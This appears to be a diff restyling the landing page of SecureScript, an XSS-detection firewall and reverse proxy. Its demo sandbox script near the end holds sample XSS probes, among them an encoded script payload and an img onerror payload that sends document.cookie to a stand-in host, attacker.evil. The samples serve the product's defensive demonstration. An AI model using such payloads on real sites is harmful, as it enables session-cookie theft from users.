     <!-- ============================================================================== -->
-    <div id="features" class="mt-28">
-      <div class="text-center max-w-2xl mx-auto mb-14">
-        <div class="inline-flex items-center gap-2 px-3 py-1 rounded-full border border-white/10 bg-white/5 text-slate-400 raster-tag mb-4">
-          <span class="w-1.5 h-1.5 bg-orange-400 rounded-sm"></span>
-          MULTI-LAYERED INLINE PIPELINE
+    <div id="pipeline" class="mt-28">
+      <div class="text-center max-w-2xl mx-auto mb-12">
+        <div class="tavus-label mb-3">
+          <span class="win-dot-square" style="background-color: var(--primatives--bubbletech-4);"></span>
+          <span>MULTI-LAYERED INLINE ARCHITECTURE</span>
         </div>
-        <h2 class="text-3xl sm:text-4xl font-bold text-white tracking-tight">
+        <h2 style="font-family: 'Suisse Intl', sans-serif; font-size: clamp(2rem, 4vw, 3rem); font-weight: 400; letter-spacing: -0.03em; color: var(--primatives--terminal-black); margin-bottom: 0.5rem;">
           Engineered for zero latency and zero bypass
         </h2>
-        <p class="text-slate-400 text-sm mt-3">
-          Traditional regex firewalls fail against polyglot and recursively encoded scripts. SecureScript combines multi-pass unrolling with neural classification.
+        <p style="color: var(--primatives--hardware-gray-8);">
+          Traditional regex patterns fail against polyglot payloads. SecureScript merges recursive normalization with deep neural classification.
         </p>
       </div>
 
       <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
         
         <!-- Bento Card 1 -->
-        <div class="os-window">
-          <div class="os-titlebar">
-            <div class="flex items-center gap-2.5">
-              <div class="w-2 h-2 bg-amber-500 rounded-sm"></div>
-              <span class="raster-tag text-slate-300">STAGE 01 // NORMALIZER</span>
+        <div class="tavus-window">
+          <div class="tavus-win-title">
+            <div class="flex items-center gap-2">
+              <span class="win-dot-square" style="background-color: var(--primatives--atomic-glow-1);"></span>
+              <span class="text-type-raster">STAGE 01 // NORMALIZER</span>
             </div>
-            <span class="text-[10px] font-mono text-slate-500">DEPTH k=4</span>
+            <span class="text-type-raster text-[10px]">k=4 DEPTH</span>
           </div>
           <div class="p-6">
-            <div class="w-10 h-10 rounded-xl bg-amber-500/10 border border-amber-500/20 flex items-center justify-center text-amber-400 text-lg mb-4">
+            <div class="w-10 h-10 border border-[#140206] shadow-[2px_2px_0_0_#140206] flex items-center justify-center text-lg mb-4" style="background-color: var(--primatives--atomic-glow-5);">
               <i class="fa-solid fa-layer-group"></i>
             </div>
-            <h3 class="text-lg font-bold text-white mb-2">Recursive De-obfuscation</h3>
-            <p class="text-sm text-slate-400 leading-relaxed">
+            <h3 style="font-family: 'Suisse Intl'; font-size: 1.25rem; font-weight: 500; color: var(--primatives--terminal-black); margin-bottom: 0.5rem;">
+              Recursive De-obfuscation
+            </h3>
+            <p style="color: var(--primatives--hardware-gray-8); font-size: 0.9rem; line-height: 1.5;">
               Unrolls nested Hex, Octal, HTML entities, and URL encodings across 4 deterministic cycles to eliminate multi-layered evasion bypasses.
             </p>
-            <div class="mt-4 pt-4 border-t border-white/[0.06] text-xs font-mono text-slate-500">
-              Avg overhead: 0.001 ms &bull; Deterministic
+            <div class="mt-4 pt-3 border-t border-[#140206]/10 text-type-raster text-[10px]" style="color: var(--primatives--hardware-gray-8);">
+              Overhead: 0.001 ms &bull; Deterministic
             </div>
           </div>
         </div>
 
         <!-- Bento Card 2 -->
-        <div class="os-window">
-          <div class="os-titlebar">
-            <div class="flex items-center gap-2.5">
-              <div class="w-2 h-2 bg-orange-500 rounded-sm"></div>
-              <span class="raster-tag text-slate-300">STAGE 02 // FAST-PATH LEXER</span>
+        <div class="tavus-window">
+          <div class="tavus-win-title">
+            <div class="flex items-center gap-2">
+              <span class="win-dot-square" style="background-color: var(--primatives--atomic-glow-4);"></span>
+              <span class="text-type-raster">STAGE 02 // FAST-PATH LEXER</span>
             </div>
-            <span class="text-[10px] font-mono text-slate-500">&lt; 2MS SLA</span>
+            <span class="text-type-raster text-[10px]">&lt; 2MS SLA</span>
           </div>
           <div class="p-6">
-            <div class="w-10 h-10 rounded-xl bg-orange-500/10 border border-orange-500/20 flex items-center justify-center text-orange-400 text-lg mb-4">
-              <i class="fa-solid fa-bolt-lightning"></i>
+            <div class="w-10 h-10 border border-[#140206] shadow-[2px_2px_0_0_#140206] flex items-center justify-center text-lg mb-4" style="background-color: var(--primatives--atomic-glow-5);">
+              <i class="fa-solid fa-bolt-lightning" style="color: var(--primatives--atomic-glow-4);"></i>
             </div>
-            <h3 class="text-lg font-bold text-white mb-2">Finite State Machine Lexer</h3>
-            <p class="text-sm text-slate-400 leading-relaxed">
+            <h3 style="font-family: 'Suisse Intl'; font-size: 1.25rem; font-weight: 500; color: var(--primatives--terminal-black); margin-bottom: 0.5rem;">
+              Finite State Machine Lexer
+            </h3>
+            <p style="color: var(--primatives--hardware-gray-8); font-size: 0.9rem; line-height: 1.5;">
               Deterministic single-pass lexical grammar analyzer instantly classifying active script tags, executable event handlers, and URI schemes.
             </p>
-            <div class="mt-4 pt-4 border-t border-white/[0.06] text-xs font-mono text-slate-500">
-              Zero backtracking &bull; O(N) linear time
+            <div class="mt-4 pt-3 border-t border-[#140206]/10 text-type-raster text-[10px]" style="color: var(--primatives--hardware-gray-8);">
+              Zero Backtracking &bull; O(N) Linear Time
             </div>
           </div>
         </div>
 
         <!-- Bento Card 3 -->
-        <div class="os-window">
-          <div class="os-titlebar">
-            <div class="flex items-center gap-2.5">
-              <div class="w-2 h-2 bg-sky-500 rounded-sm"></div>
-              <span class="raster-tag text-slate-300">STAGE 03 // BI-LSTM NEURAL</span>
+        <div class="tavus-window">
+          <div class="tavus-win-title">
+            <div class="flex items-center gap-2">
+              <span class="win-dot-square" style="background-color: var(--primatives--bubbletech-4);"></span>
+              <span class="text-type-raster">STAGE 03 // BI-LSTM NEURAL</span>
             </div>
-            <span class="text-[10px] font-mono text-slate-500">PYTORCH AI</span>
+            <span class="text-type-raster text-[10px]">PYTORCH AI</span>
           </div>
           <div class="p-6">
-            <div class="w-10 h-10 rounded-xl bg-sky-500/10 border border-sky-500/20 flex items-center justify-center text-sky-400 text-lg mb-4">
-              <i class="fa-solid fa-brain"></i>
+            <div class="w-10 h-10 border border-[#140206] shadow-[2px_2px_0_0_#140206] flex items-center justify-center text-lg mb-4" style="background-color: var(--primatives--bubbletech-1);">
+              <i class="fa-solid fa-brain" style="color: var(--primatives--bubbletech-4);"></i>
             </div>
-            <h3 class="text-lg font-bold text-white mb-2">Neural Vector Evaluation</h3>
-            <p class="text-sm text-slate-400 leading-relaxed">
+            <h3 style="font-family: 'Suisse Intl'; font-size: 1.25rem; font-weight: 500; color: var(--primatives--terminal-black); margin-bottom: 0.5rem;">
+              Neural Vector Evaluation
+            </h3>
+            <p style="color: var(--primatives--hardware-gray-8); font-size: 0.9rem; line-height: 1.5;">
               Bi-directional Long Short-Term Memory evaluates semantic payload contexts for zero-day mutations and ambiguous constructs.
             </p>
-            <div class="mt-4 pt-4 border-t border-white/[0.06] text-xs font-mono text-slate-500">
+            <div class="mt-4 pt-3 border-t border-[#140206]/10 text-type-raster text-[10px]" style="color: var(--primatives--hardware-gray-8);">
               Threshold: &ge; 0.85 &bull; Inferred &lt; 20ms
             </div>
           </div>
@@ -419,46 +569,50 @@
 
       </div>
 
-      <!-- Bento Row 2: Wider Windows -->
+      <!-- Bento Row 2 -->
       <div class="grid grid-cols-1 md:grid-cols-2 gap-6 mt-6">
         
-        <!-- Multi-Tenancy Module -->
-        <div class="os-window">
-          <div class="os-titlebar">
-            <div class="flex items-center gap-2.5">
-              <div class="w-2 h-2 bg-emerald-500 rounded-sm"></div>
-              <span class="raster-tag text-slate-300">TENANT ROUTING // PROXY FABRIC</span>
+        <!-- Multi-Tenant Fabric -->
+        <div class="tavus-window">
+          <div class="tavus-win-title">
+            <div class="flex items-center gap-2">
+              <span class="win-dot-square" style="background-color: var(--primatives--neon-field-4);"></span>
+              <span class="text-type-raster">TENANT ROUTING // PROXY FABRIC</span>
             </div>
-            <span class="text-[10px] font-mono text-emerald-400">LRU CACHED</span>
+            <span class="text-type-raster text-[10px]">LRU CACHED 60S</span>
           </div>
           <div class="p-6">
-            <h3 class="text-lg font-bold text-white mb-2">Zero-Config Reverse Proxy Fabric</h3>
-            <p class="text-sm text-slate-400 leading-relaxed mb-4">
-              Register any deployed frontend (Vercel, Netlify, Cloudflare) and backend (Render, AWS, GCP). Traffic routes seamlessly through <code class="text-orange-400 font-mono text-xs">/proxy/{slug}/{path}</code> with automated header isolation and origin health fallback.
+            <h3 style="font-family: 'Suisse Intl'; font-size: 1.25rem; font-weight: 500; color: var(--primatives--terminal-black); margin-bottom: 0.5rem;">
+              Zero-Config Reverse Proxy Fabric
+            </h3>
+            <p style="color: var(--primatives--hardware-gray-8); font-size: 0.9rem; line-height: 1.5; margin-bottom: 1rem;">
+              Register any frontend and backend URLs. Traffic routes securely via <code class="font-mono text-xs px-1 border border-[#140206] bg-[#eae5de]">/proxy/{slug}/{path}</code> with automated header isolation and origin health fallback.
             </p>
-            <div class="p-3 bg-[#0a0c12] rounded-lg border border-white/5 font-mono text-xs text-slate-300">
-              <span class="text-slate-500">Client &rarr;</span> <span class="text-orange-400">securescript.app/proxy/acme-prod/api/checkout</span> &rarr; <span class="text-emerald-400">Passed [WAF 200]</span> &rarr; <span class="text-slate-400">Origin Server</span>
+            <div class="p-3 border border-[#140206] font-mono text-xs text-slate-800" style="background-color: var(--primatives--pc-plastic-2);">
+              Client &rarr; <span class="font-bold">securescript.app/proxy/acme-prod/api/checkout</span> &rarr; <span style="color: var(--primatives--neon-field-4); font-weight: bold;">[WAF 200]</span> &rarr; Origin
             </div>
           </div>
         </div>
 
-        <!-- SIEM & Telemetry Module -->
-        <div class="os-window">
-          <div class="os-titlebar">
-            <div class="flex items-center gap-2.5">
-              <div class="w-2 h-2 bg-purple-500 rounded-sm"></div>
-              <span class="raster-tag text-slate-300">FORENSICS // SIEM & RAY IDS</span>
+        <!-- SIEM & Forensics -->
+        <div class="tavus-window">
+          <div class="tavus-win-title">
+            <div class="flex items-center gap-2">
+              <span class="win-dot-square" style="background-color: var(--primatives--floppy-fog-3);"></span>
+              <span class="text-type-raster">FORENSICS // SIEM &amp; RAY IDS</span>
             </div>
-            <span class="text-[10px] font-mono text-purple-400">ECS & CEF</span>
+            <span class="text-type-raster text-[10px]">ECS &amp; CEF</span>
           </div>
           <div class="p-6">
-            <h3 class="text-lg font-bold text-white mb-2">Enterprise Incident Attribution</h3>
-            <p class="text-sm text-slate-400 leading-relaxed mb-4">
+            <h3 style="font-family: 'Suisse Intl'; font-size: 1.25rem; font-weight: 500; color: var(--primatives--terminal-black); margin-bottom: 0.5rem;">
+              Enterprise Incident Attribution
+            </h3>
+            <p style="color: var(--primatives--hardware-gray-8); font-size: 0.9rem; line-height: 1.5; margin-bottom: 1rem;">
               Every neutralized attempt generates an immutable Ray ID, token attribution breakdown, client IP profile, and feeds directly into your SOC via Slack, Discord, Elastic ECS, or ArcSight CEF.
             </p>
-            <div class="p-3 bg-[#0a0c12] rounded-lg border border-white/5 font-mono text-xs text-slate-300 flex items-center justify-between">
+            <div class="p-3 border border-[#140206] font-mono text-xs flex items-center justify-between" style="background-color: var(--primatives--pc-plastic-2);">
               <span>RAY-9A82F104BC &bull; Webhook Dispatched</span>
-              <span class="text-purple-400">JSON Alert OK</span>
+              <span class="text-type-raster font-bold" style="color: var(--primatives--atomic-glow-4);">JSON ALERT OK</span>
             </div>
           </div>
         </div>
@@ -467,73 +621,59 @@
     </div>
 
     <!-- ============================================================================== -->
-    <!-- Developer & Deployment Section (Tavus Terminal Window)                          -->
+    <!-- Developer Terminal Quickstart                                                  -->
     <!-- ============================================================================== -->
-    <div id="developer" class="mt-28">
-      <div class="text-center max-w-2xl mx-auto mb-14">
-        <div class="inline-flex items-center gap-2 px-3 py-1 rounded-full border border-white/10 bg-white/5 text-slate-400 raster-tag mb-4">
-          <span class="w-1.5 h-1.5 bg-orange-400 rounded-sm"></span>
-          DEVELOPER WORKFLOW
+    <div id="quickstart" class="mt-28">
+      <div class="text-center max-w-2xl mx-auto mb-10">
+        <div class="tavus-label mb-3">
+          <span class="win-dot-square" style="background-color: var(--primatives--atomic-glow-4);"></span>
+          <span>RUNTIME DEPLOYMENT</span>
         </div>
-        <h2 class="text-3xl sm:text-4xl font-bold text-white tracking-tight">
-          Connect your stack in under two minutes
+        <h2 style="font-family: 'Suisse Intl', sans-serif; font-size: clamp(2rem, 4vw, 3rem); font-weight: 400; letter-spacing: -0.03em; color: var(--primatives--terminal-black);">
+          Connect your stack in two minutes
         </h2>
       </div>
 
-      <div class="os-window max-w-4xl mx-auto">
-        <div class="os-titlebar">
-          <div class="flex items-center gap-3">
-            <div class="flex items-center gap-1.5">
-              <span class="w-2.5 h-2.5 rounded-full bg-red-500/80"></span>
-              <span class="w-2.5 h-2.5 rounded-full bg-amber-500/80"></span>
-              <span class="w-2.5 h-2.5 rounded-full bg-emerald-500/80"></span>
-            </div>
-            <span class="raster-tag text-slate-400 ml-2">QUICKSTART // RUNTIME INTEGRATION</span>
+      <div class="tavus-window-terminal max-w-4xl mx-auto">
+        <div class="p-3 flex items-center justify-between border-b border-white/20" style="background-color: #28292a;">
+          <div class="flex items-center gap-2">
+            <span class="win-dot-square" style="background-color: var(--primatives--atomic-glow-4);"></span>
+            <span class="text-type-raster text-white">QUICKSTART // RUNTIME INTEGRATION</span>
           </div>
-          
-          <!-- Terminal Tabs -->
-          <div class="flex items-center gap-1 text-xs font-mono">
-            <button onclick="switchCodeTab('curl')" id="tab-curl" class="px-2.5 py-1 rounded bg-white/10 text-white font-medium">cURL</button>
-            <button onclick="switchCodeTab('python')" id="tab-python" class="px-2.5 py-1 rounded text-slate-400 hover:text-white">Python</button>
-            <button onclick="switchCodeTab('docker')" id="tab-docker" class="px-2.5 py-1 rounded text-slate-400 hover:text-white">Docker</button>
+
+          <div class="flex items-center gap-1">
+            <button onclick="switchCodeTab('curl')" id="tab-curl" class="tavus-btn-secondary px-2.5 py-0.5 text-xs text-type-raster" style="background: var(--primatives--pc-plastic-1);">cURL</button>
+            <button onclick="switchCodeTab('python')" id="tab-python" class="tavus-btn-secondary px-2.5 py-0.5 text-xs text-type-raster" style="background: var(--primatives--pc-plastic-3);">Python</button>
+            <button onclick="switchCodeTab('docker')" id="tab-docker" class="tavus-btn-secondary px-2.5 py-0.5 text-xs text-type-raster" style="background: var(--primatives--pc-plastic-3);">Docker</button>
           </div>
         </div>
 
-        <div class="p-6 bg-[#090b10] font-mono text-sm leading-relaxed overflow-x-auto">
-          <!-- cURL Tab -->
-          <div id="code-curl" class="space-y-2 text-slate-300">
-            <div class="text-slate-500"># 1. Register a project and receive your proxy slug</div>
+        <div class="p-6 font-mono text-sm leading-relaxed overflow-x-auto text-slate-200">
+          <div id="code-curl" class="space-y-1.5">
+            <div style="color: var(--primatives--hardware-gray-8);"># 1. Register project via REST API</div>
             <div>curl -X POST https://securescript-pinq.onrender.com/platform/projects \</div>
             <div class="pl-4">-H "Authorization: Bearer &lt;YOUR_JWT_TOKEN&gt;" \</div>
             <div class="pl-4">-H "Content-Type: application/json" \</div>
             <div class="pl-4">-d '{"name": "Production App", "frontend_url": "https://myapp.vercel.app"}'</div>
             <br>
-            <div class="text-slate-500"># 2. Route your live traffic safely through SecureScript:</div>
-            <div class="text-emerald-400">curl -i https://securescript-pinq.onrender.com/proxy/production-app-4c2b/</div>
+            <div style="color: var(--primatives--hardware-gray-8);"># 2. Route live traffic through SecureScript:</div>
+            <div style="color: var(--primatives--neon-field-2);">curl -i https://securescript-pinq.onrender.com/proxy/production-app-4c2b/</div>
           </div>
 
-          <!-- Python Tab -->
-          <div id="code-python" class="hidden space-y-2 text-slate-300">
-            <div class="text-slate-500"># Inline ASGI Middleware integration for FastAPI or Starlette</div>
-            <div><span class="text-orange-400">from</span> securescript.middleware.asgi <span class="text-orange-400">import</span> SecureScriptMiddleware</div>
-            <div><span class="text-orange-400">from</span> fastapi <span class="text-orange-400">import</span> FastAPI</div>
+          <div id="code-python" class="hidden space-y-1.5">
+            <div style="color: var(--primatives--hardware-gray-8);"># Inline ASGI Middleware for FastAPI / Starlette</div>
+            <div><span style="color: var(--primatives--atomic-glow-4);">from</span> securescript.middleware.asgi <span style="color: var(--primatives--atomic-glow-4);">import</span> SecureScriptMiddleware</div>
+            <div><span style="color: var(--primatives--atomic-glow-4);">from</span> fastapi <span style="color: var(--primatives--atomic-glow-4);">import</span> FastAPI</div>
             <br>
             <div>app = FastAPI()</div>
-            <div>app.add_middleware(</div>
-            <div class="pl-4">SecureScriptMiddleware,</div>
-            <div class="pl-4">mode=<span class="text-amber-300">"block"</span>,</div>
-            <div class="pl-4">dl_threshold=<span class="text-emerald-300">0.85</span></div>
-            <div>)</div>
+            <div>app.add_middleware(SecureScriptMiddleware, mode=<span style="color: var(--primatives--atomic-glow-1);">"block"</span>, dl_threshold=0.85)</div>
           </div>
 
-          <!-- Docker Tab -->
-          <div id="code-docker" class="hidden space-y-2 text-slate-300">
-            <div class="text-slate-500"># Deploy production multi-tenant gateway with PostgreSQL</div>
+          <div id="code-docker" class="hidden space-y-1.5">
+            <div style="color: var(--primatives--hardware-gray-8);"># Deploy multi-tenant stack with PostgreSQL via Docker</div>
             <div>git clone https://github.com/manv-3/securescript.git</div>
             <div>cd securescript</div>
-            <div>docker compose up --build -d</div>
-            <br>
-            <div class="text-slate-500"># Gateway running on :8000 (Console at /dashboard)</div>
+            <div style="color: var(--primatives--neon-field-2);">docker compose up --build -d</div>
           </div>
         </div>
       </div>
@@ -544,29 +684,33 @@
     <!-- ============================================================================== -->
     <div class="mt-28 grid grid-cols-1 md:grid-cols-2 gap-6">
       
-      <!-- CTA 1 -->
-      <div class="os-window p-8 bg-gradient-to-br from-orange-500/10 via-[#0f1118] to-[#08090d]">
-        <div class="raster-tag text-orange-400 mb-3">SELF-SERVICE ONBOARDING</div>
-        <h3 class="text-2xl font-bold text-white mb-2">Connect your web application</h3>
-        <p class="text-sm text-slate-400 mb-6">
-          Set up an account and connect your first website in seconds. Immediate 3-tier inline inspection.
+      <div class="tavus-window p-8" style="background-color: var(--primatives--pc-plastic-2);">
+        <div class="text-type-raster mb-2" style="color: var(--primatives--atomic-glow-4);">
+          SELF-SERVICE ONBOARDING
+        </div>
+        <h3 style="font-family: 'Suisse Intl'; font-size: 1.75rem; font-weight: 500; color: var(--primatives--terminal-black); margin-bottom: 0.5rem;">
+          Connect your web application
+        </h3>
+        <p style="color: var(--primatives--hardware-gray-8); margin-bottom: 1.5rem; font-size: 0.95rem;">
+          Create a free tenant account and connect your first website in seconds. Immediate 3-tier inline inspection.
         </p>
-        <a href="/signup" class="inline-flex items-center gap-2 px-6 py-3 bg-orange-500 hover:bg-orange-600 text-white font-semibold rounded-xl text-sm transition shadow-lg shadow-orange-500/25">
-          <span>Start Protecting Site</span>
-          <i class="fa-solid fa-arrow-right text-xs"></i>
+        <a href="/signup" class="tavus-btn-primary px-6 py-3 text-xs text-type-raster">
+          <span>CONNECT FIRST SITE &rarr;</span>
         </a>
       </div>
 
-      <!-- CTA 2 -->
-      <div class="os-window p-8 bg-gradient-to-br from-sky-500/10 via-[#0f1118] to-[#08090d]">
-        <div class="raster-tag text-sky-400 mb-3">OPERATIONS & SIEM</div>
-        <h3 class="text-2xl font-bold text-white mb-2">Security Operations Console</h3>
-        <p class="text-sm text-slate-400 mb-6">
+      <div class="tavus-window p-8" style="background-color: var(--primatives--pc-plastic-2);">
+        <div class="text-type-raster mb-2" style="color: var(--primatives--bubbletech-4);">
+          OPERATIONS &amp; FORENSICS
+        </div>
+        <h3 style="font-family: 'Suisse Intl'; font-size: 1.75rem; font-weight: 500; color: var(--primatives--terminal-black); margin-bottom: 0.5rem;">
+          Security Operations Console
+        </h3>
+        <p style="color: var(--primatives--hardware-gray-8); margin-bottom: 1.5rem; font-size: 0.95rem;">
           Stream live incident telemetry, inspect Ray ID headers, and examine token attribution diagnostics.
         </p>
-        <a href="/dashboard" target="_blank" class="inline-flex items-center gap-2 px-6 py-3 bg-white/10 hover:bg-white/15 text-white font-semibold rounded-xl text-sm border border-white/10 transition">
-          <span>Launch SOC Dashboard</span>
-          <i class="fa-solid fa-arrow-up-right-from-square text-xs"></i>
+        <a href="/dashboard" target="_blank" class="tavus-btn-secondary px-6 py-3 text-xs text-type-raster">
+          <span>LAUNCH SOC DASHBOARD &rarr;</span>
         </a>
       </div>
 
@@ -575,88 +719,79 @@
   </main>
 
   <!-- ============================================================================== -->
-  <!-- Tavus Multi-Column Footer                                                      -->
+  <!-- Exact Tavus.io Multi-Column Footer                                             -->
   <!-- ============================================================================== -->
-  <footer class="border-t border-white/[0.08] bg-[#050608] pt-16 pb-12 text-sm text-slate-400">
+  <footer style="background-color: var(--primatives--pc-plastic-2); border-top: 1px solid var(--themes--border); padding-top: 4rem; padding-bottom: 3rem;">
     <div class="max-w-7xl mx-auto px-6">
-      <div class="grid grid-cols-2 md:grid-cols-5 gap-8 mb-16">
+      <div class="grid grid-cols-2 md:grid-cols-5 gap-8 mb-12">
         
-        <!-- Col 1: Platform -->
         <div>
-          <div class="raster-tag text-white mb-4">PLATFORM</div>
-          <ul class="space-y-2.5 text-xs">
-            <li><a href="/platform" class="hover:text-white transition">Overview</a></li>
-            <li><a href="/signup" class="hover:text-white transition">Sign Up</a></li>
-            <li><a href="/login" class="hover:text-white transition">Tenant Login</a></li>
-            <li><a href="/app/projects" class="hover:text-white transition">Projects</a></li>
+          <div class="text-type-raster mb-3" style="color: var(--primatives--terminal-black);">PLATFORM</div>
+          <ul class="space-y-2 text-xs" style="list-style: none; padding: 0;">
+            <li><a href="/platform" class="text-inherit hover:underline">Overview</a></li>
+            <li><a href="/signup" class="text-inherit hover:underline">Sign Up</a></li>
+            <li><a href="/login" class="text-inherit hover:underline">Tenant Login</a></li>
+            <li><a href="/app/projects" class="text-inherit hover:underline">Projects</a></li>
           </ul>
         </div>
 
-        <!-- Col 2: Engine -->
         <div>
-          <div class="raster-tag text-white mb-4">RESEARCH & ENGINE</div>
-          <ul class="space-y-2.5 text-xs">
-            <li><a href="#features" class="hover:text-white transition">Recursive Normalizer</a></li>
-            <li><a href="#features" class="hover:text-white transition">Fast-Path Lexer</a></li>
-            <li><a href="#features" class="hover:text-white transition">Bi-LSTM Neural Core</a></li>
-            <li><a href="/dashboard" class="hover:text-white transition">Token Attribution</a></li>
+          <div class="text-type-raster mb-3" style="color: var(--primatives--terminal-black);">RESEARCH &amp; ENGINES</div>
+          <ul class="space-y-2 text-xs" style="list-style: none; padding: 0;">
+            <li><a href="#pipeline" class="text-inherit hover:underline">Recursive Normalizer</a></li>
+            <li><a href="#pipeline" class="text-inherit hover:underline">Fast-Path Lexer</a></li>
+            <li><a href="#pipeline" class="text-inherit hover:underline">Bi-LSTM Neural Core</a></li>
+            <li><a href="/dashboard" class="text-inherit hover:underline">Token Attribution</a></li>
           </ul>
         </div>
 
-        <!-- Col 3: Developers -->
         <div>
-          <div class="raster-tag text-white mb-4">DEVELOPERS</div>
-          <ul class="space-y-2.5 text-xs">
-            <li><a href="/docs" target="_blank" class="hover:text-white transition">Swagger API</a></li>
-            <li><a href="https://github.com/manv-3/securescript" target="_blank" class="hover:text-white transition">GitHub Repository</a></li>
-            <li><a href="/api/dashboard/stats" target="_blank" class="hover:text-white transition">Stats Endpoint</a></li>
-            <li><a href="/api/v1/siem/events" target="_blank" class="hover:text-white transition">SIEM Event Stream</a></li>
+          <div class="text-type-raster mb-3" style="color: var(--primatives--terminal-black);">DEVELOPERS</div>
+          <ul class="space-y-2 text-xs" style="list-style: none; padding: 0;">
+            <li><a href="/docs" target="_blank" class="text-inherit hover:underline">Swagger API</a></li>
+            <li><a href="https://github.com/manv-3/securescript" target="_blank" class="text-inherit hover:underline">GitHub Repository</a></li>
+            <li><a href="/api/dashboard/stats" target="_blank" class="text-inherit hover:underline">Stats Endpoint</a></li>
+            <li><a href="/api/v1/siem/events" target="_blank" class="text-inherit hover:underline">SIEM Event Stream</a></li>
           </ul>
         </div>
 
-        <!-- Col 4: Telemetry -->
         <div>
-          <div class="raster-tag text-white mb-4">TELEMETRY</div>
-          <ul class="space-y-2.5 text-xs">
-            <li><a href="/dashboard" class="hover:text-white transition">Security Console</a></li>
-            <li><a href="/api/v1/siem/export/ecs" class="hover:text-white transition">ECS Export</a></li>
-            <li><a href="/api/v1/siem/export/cef" class="hover:text-white transition">CEF Export</a></li>
-            <li><a href="/api/v1/csp-report" class="hover:text-white transition">W3C CSP Collector</a></li>
+          <div class="text-type-raster mb-3" style="color: var(--primatives--terminal-black);">TELEMETRY</div>
+          <ul class="space-y-2 text-xs" style="list-style: none; padding: 0;">
+            <li><a href="/dashboard" class="text-inherit hover:underline">Security Console</a></li>
+            <li><a href="/api/v1/siem/export/ecs" class="text-inherit hover:underline">ECS Export</a></li>
+            <li><a href="/api/v1/siem/export/cef" class="text-inherit hover:underline">CEF Export</a></li>
+            <li><a href="/api/v1/csp-report" class="text-inherit hover:underline">W3C CSP Collector</a></li>
           </ul>
         </div>
 
-        <!-- Col 5: Attribution -->
         <div class="col-span-2 md:col-span-1">
-          <div class="raster-tag text-white mb-4">PROJECT CONTEXT</div>
-          <p class="text-xs text-slate-500 leading-relaxed">
+          <div class="text-type-raster mb-3" style="color: var(--primatives--terminal-black);">PROJECT CONTEXT</div>
+          <p class="text-xs" style="color: var(--primatives--hardware-gray-8); line-height: 1.5;">
             Engineered for the HCL Internship Program (2026). Real-Time Cross-Site Scripting Detection Framework.
           </p>
-          <div class="mt-4 flex items-center gap-2">
-            <span class="w-2 h-2 rounded-full bg-emerald-400 status-dot"></span>
-            <span class="text-[11px] font-mono text-emerald-400 font-medium">ALL ENGINES NOMINAL</span>
+          <div class="mt-3 flex items-center gap-2">
+            <span class="win-dot-square" style="background-color: var(--primatives--neon-field-4);"></span>
+            <span class="text-type-raster" style="color: var(--primatives--neon-field-4); font-size: 0.68rem;">ALL ENGINES NOMINAL</span>
           </div>
         </div>
 
       </div>
 
-      <!-- Bottom Bar -->
-      <div class="pt-8 border-t border-white/[0.06] flex flex-col sm:flex-row items-center justify-between text-xs text-slate-600 gap-4">
+      <div class="pt-6 border-t border-[#140206]/15 flex flex-col sm:flex-row items-center justify-between text-xs gap-3" style="color: var(--primatives--hardware-gray-8);">
         <div>&copy; 2026 SecureScript Framework. All rights reserved.</div>
-        <div class="font-mono text-slate-500">LATENCY SLA: &lt; 2.0MS // ZERO ORIGIN LEAK</div>
+        <div class="text-type-raster">LATENCY SLA: &lt; 2.0MS // ZERO ORIGIN LEAK</div>
       </div>
     </div>
   </footer>
 
-  <!-- ============================================================================== -->
-  <!-- Interactive Sandbox & UI Scripting                                             -->
-  <!-- ============================================================================== -->
+  <!-- Interactive Sandbox Script -->
   <script>
     const PROBES = {
       clean: {
         text: "Hello, I would like to inquire about your product pricing and security capabilities.",
-        verdict: "CLEAN",
         badgeText: "HTTP 200 PROXIED",
-        badgeClass: "bg-emerald-500/20 text-emerald-400 border border-emerald-500/30",
+        badgeStyle: "background-color: var(--primatives--neon-field-4); color: #ffffff; border: 1px solid #ffffff;",
         stage: "Fast-Path Lexical Analyzer",
         confidence: "0.0000 (Safe)",
         latency: "0.002 ms",
@@ -664,9 +799,8 @@
       },
       xss_script: {
         text: "<script>alert(document.cookie)<\/script>",
-        verdict: "BLOCKED",
         badgeText: "HTTP 403 BLOCKED",
-        badgeClass: "bg-rose-500/20 text-rose-400 border border-rose-500/30",
+        badgeStyle: "background-color: var(--primatives--bubbletech-4); color: #ffffff; border: 1px solid #ffffff;",
         stage: "Fast-Path Lexical Analyzer",
         confidence: "1.0000 (Definitive Threat)",
         latency: "0.003 ms",
@@ -674,9 +808,8 @@
       },
       xss_encoded: {
         text: "%253Cscript%253Ealert(String.fromCharCode(88,83,83))%253C%252Fscript%253E",
-        verdict: "BLOCKED",
         badgeText: "HTTP 403 BLOCKED",
-        badgeClass: "bg-rose-500/20 text-rose-400 border border-rose-500/30",
+        badgeStyle: "background-color: var(--primatives--bubbletech-4); color: #ffffff; border: 1px solid #ffffff;",
         stage: "Recursive Normalizer (k=2) &rarr; Fast-Path Lexer",
         confidence: "1.0000 (Multi-Pass De-obfuscated)",
         latency: "0.008 ms",
@@ -684,9 +817,8 @@
       },
       xss_event: {
         text: '<img src=x onerror="fetch(\'https://attacker.evil/c=\' + document.cookie)">',
-        verdict: "BLOCKED",
         badgeText: "HTTP 403 BLOCKED",
-        badgeClass: "bg-rose-500/20 text-rose-400 border border-rose-500/30",
+        badgeStyle: "background-color: var(--primatives--bubbletech-4); color: #ffffff; border: 1px solid #ffffff;",
         stage: "PyTorch Bi-LSTM Neural Core",
         confidence: "0.9984 (Neural Threat Score)",
         latency: "0.540 ms",
@@ -703,7 +835,7 @@
 
     function applyTelemetry(data) {
       const badge = document.getElementById('verdict-badge');
-      badge.className = `px-2 py-0.5 rounded text-[10px] font-mono font-bold ${data.badgeClass}`;
+      badge.style = data.badgeStyle;
       badge.innerText = data.badgeText;
 
       const randomRay = "RAY-" + Math.random().toString(36).substring(2, 10).toUpperCase();
@@ -717,10 +849,10 @@
     function runInspection() {
       const val = document.getElementById('payload-input').value.trim();
       const btn = document.getElementById('btn-inspect');
-      btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin text-xs"></i><span>Evaluating...</span>';
+      btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin text-[10px] mr-1"></i><span>EVALUATING…</span>';
       
       setTimeout(() => {
-        btn.innerHTML = '<i class="fa-solid fa-play text-xs"></i><span>Inspect Stream</span>';
+        btn.innerHTML = '<i class="fa-solid fa-play text-[10px] mr-1.5"></i><span>INSPECT STREAM</span>';
         
         const lower = val.toLowerCase();
